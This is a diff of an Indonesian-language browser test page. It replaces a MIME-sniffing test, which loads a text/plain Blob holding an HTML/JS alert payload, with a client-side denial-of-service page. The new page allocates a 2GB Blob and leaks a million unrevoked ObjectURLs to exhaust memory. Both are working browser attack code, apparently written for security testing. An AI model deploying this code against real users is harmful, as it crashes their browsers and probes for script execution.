@@ -3,33 +3,30 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Advanced MIME Sniffing Test</title>
+<title>Client-Side DoS (Memory Exhaustion)</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
 .panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 600px; width: 100%; border: 1px solid #333; }
 h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
 p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
-button { width: 100%; padding: 16px; margin-bottom: 10px; cursor: pointer; border: none; border-radius: 6px; font-weight: bold; font-size: 15px; color: #fff; transition: background 0.2s; }
-.btn-red { background: #d32f2f; }
-.btn-red:hover { background: #b71c1c; }
-.btn-blue { background: #0078d4; }
-.btn-blue:hover { background: #005a9e; }
-.btn-green { background: #2e7d32; }
-.btn-green:hover { background: #1b5e20; }
+button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #fff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; margin-bottom: 10px; }
+button:hover { background: #b71c1c; }
+button:disabled { background: #555; }
 #status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
+.warning { background: #331111; color: #ff4444; padding: 10px; border-radius: 6px; margin-bottom: 20px; font-size: 13px; border: 1px solid #ff4444; }
 .log { background: #000; color: #0f0; padding: 10px; border-radius: 6px; font-family: monospace; text-align: left; margin-top: 15px; height: 150px; overflow-y: auto; font-size: 12px; }
 </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-    <h1>Advanced MIME Sniffing Test</h1>
-    <p>Menguji apakah browser merender konten HTML/JS dari Blob yang dideklarasikan sebagai text/plain.</p>
+    <div class="warning">⚠️ PERINGATAN: Klik tombol di bawah akan memicu Memory Exhaustion. Browser Anda akan HANG atau CRASH total!</div>
+    <h1>Client-Side DoS</h1>
+    <p>Membuat Blob raksasa dan jutaan ObjectURL tanpa revoke.</p>
     
-    <button id="btn-tab" class="btn-red">1. Buka di Tab Baru (window.open)</button>
-    <button id="btn-iframe" class="btn-blue">2. Muat di Iframe Tersembunyi</button>
-    <button id="btn-download" class="btn-green">3. Unduh sebagai .txt (MIME text/plain)</button>
+    <button id="btn-blob" type="button">1. Blob Raksasa (2GB)</button>
+    <button id="btn-url" type="button">2. Jutaan ObjectURL (Leak)</button>
     
     <div id="status" role="status">Sistem siap.</div>
     <div class="log" id="log">Log akan muncul di sini...</div>
@@ -38,82 +35,85 @@ button { width: 100%; padding: 16px; margin-bottom: 10px; cursor: pointer; borde
 <script>
     const statusDiv = document.getElementById("status");
     const logDiv = document.getElementById("log");
+    let isRunning = false;
 
     function log(msg) {
         logDiv.innerHTML += "<br>> " + msg;
         console.log(msg);
     }
 
-    // Payload HTML/JS yang disamarkan
-    const payloadText = "<!DOCTYPE html><html><body style='background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20%;'><h1>MIME SNIFFED!</h1><p>Browser merender text/plain sebagai HTML.</p><script>alert('VALID BUG: MIME Sniffing Berhasil!');<\/script></body></html>";
+    // 1. Blob Raksasa (Memory Bombing)
+    document.getElementById("btn-blob").addEventListener("click", () => {
+        if (isRunning) return;
+        isRunning = true;
+        document.getElementById("btn-blob").disabled = true;
+        document.getElementById("btn-url").disabled = true;
+        
+        statusDiv.textContent = "Membuat Blob 2GB...";
+        log("Memulai alokasi RAM 2GB...");
 
-    // 1. Buka di Tab Baru
-    document.getElementById("btn-tab").addEventListener("click", () => {
-        statusDiv.textContent = "Membuka di tab baru...";
-        log("Membuat Blob text/plain...");
-        
-        const blob = new Blob([payloadText], { type: "text/plain" });
-        const url = URL.createObjectURL(blob);
-        
-        log("Memicu window.open()...");
-        const win = window.open(url, "_blank");
-        
-        if (win) {
-            log("Tab baru berhasil dibuka.");
-            statusDiv.textContent = "Tab terbuka. Cek apakah alert muncul.";
+        // Alokasi 2GB RAM
+        const sizeInBytes = 2 * 1024 * 1024 * 1024; // 2GB
+        try {
+            const buffer = new ArrayBuffer(sizeInBytes);
+            const blob = new Blob([buffer], { type: 'application/octet-stream' });
+            const url = URL.createObjectURL(blob);
+            
+            log("Blob 2GB berhasil dibuat.");
+            statusDiv.textContent = "Blob 2GB dibuat! Cek apakah browser crash.";
             statusDiv.style.color = "#4CAF50";
-        } else {
-            log("Pop-up diblokir.");
-            statusDiv.textContent = "Pop-up diblokir!";
+        } catch (e) {
+            log("Gagal alokasi: " + e.message);
+            statusDiv.textContent = "Gagal: " + e.message;
             statusDiv.style.color = "#f00";
         }
     });
 
-    // 2. Muat di Iframe Tersembunyi
-    document.getElementById("btn-iframe").addEventListener("click", () => {
-        statusDiv.textContent = "Memuat di iframe tersembunyi...";
-        log("Membuat Blob text/plain...");
+    // 2. Jutaan ObjectURL (Memory Leak)
+    document.getElementById("btn-url").addEventListener("click", () => {
+        if (isRunning) return;
+        isRunning = true;
+        document.getElementById("btn-blob").disabled = true;
+        document.getElementById("btn-url").disabled = true;
         
-        const blob = new Blob([payloadText], { type: "text/plain" });
-        const url = URL.createObjectURL(blob);
-        
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = url;
-        document.body.appendChild(iframe);
-        
-        log("Iframe dimuat. Cek apakah alert muncul.");
-        statusDiv.textContent = "Iframe dimuat. Cek alert.";
-        statusDiv.style.color = "#4CAF50";
-        
-        setTimeout(() => {
-            if (iframe.parentNode) document.body.removeChild(iframe);
-            URL.revokeObjectURL(url);
-        }, 5000);
-    });
+        statusDiv.textContent = "Membuat jutaan ObjectURL...";
+        log("Memulai pembuatan ObjectURL tanpa revoke...");
 
-    // 3. Unduh sebagai .txt (Uji MIME Sniffing saat dibuka dari lokal)
-    document.getElementById("btn-download").addEventListener("click", () => {
-        statusDiv.textContent = "Mengunduh file .txt...";
-        log("Membuat Blob text/plain...");
-        
-        const blob = new Blob([payloadText], { type: "text/plain" });
-        const url = URL.createObjectURL(blob);
-        
-        const a = document.createElement("a");
-        a.href = url;
-        a.download = "test-sniffing.txt";
-        document.body.appendChild(a);
-        a.click();
-        
-        setTimeout(() => {
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-        }, 1000);
-        
-        log("File .txt terunduh. Buka file tersebut di browser.");
-        statusDiv.textContent = "File terunduh. Buka file .txt di browser.";
-        statusDiv.style.color = "#4CAF50";
+        let count = 0;
+        const targetCount = 1000000; // 1 Juta URL
+
+        function createURL() {
+            if (count >= targetCount) {
+                statusDiv.textContent = "Selesai. Total URL: " + count;
+                statusDiv.style.color = "#4CAF50";
+                return;
+            }
+
+            try {
+                // Buat Blob kecil (1KB)
+                const blob = new Blob(["X".repeat(1024)], { type: 'text/plain' });
+                const url = URL.createObjectURL(blob);
+                
+                // Simpan URL di array global agar tidak di-GC (Memory Leak)
+                window.urlLeak = window.urlLeak || [];
+                window.urlLeak.push(url);
+                
+                count++;
+                if (count % 10000 === 0) {
+                    statusDiv.textContent = "Membuat URL ke-" + count;
+                    log("URL ke-" + count + " dibuat.");
+                }
+                
+                // Loop secepat mungkin
+                queueMicrotask(createURL);
+            } catch (e) {
+                log("Gagal di URL ke-" + count + ": " + e.message);
+                statusDiv.textContent = "Crash di URL ke-" + count;
+                statusDiv.style.color = "#f00";
+            }
+        }
+
+        createURL();
     });
 </script>
 </body>
